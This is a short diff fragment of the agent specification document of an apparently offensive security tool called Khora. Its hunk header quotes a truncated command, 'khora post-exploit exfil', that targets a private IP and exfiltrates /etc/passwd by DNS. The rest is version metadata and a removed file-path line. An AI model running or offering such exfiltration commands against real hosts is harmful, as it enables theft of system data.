@@ -419,4 +419,3 @@ khora post-exploit exfil --target 192.168.1.100 --data /etc/passwd --method dns-
 **Document Version:** 1.0
 **Last Updated:** 2026-05-09
 **Review Cycle:** Quarterly</content>
-<parameter name="filePath">c:\Users\simon\Documents\GitHub\Khora\docs\AGENT_SPECIFICATIONS.md
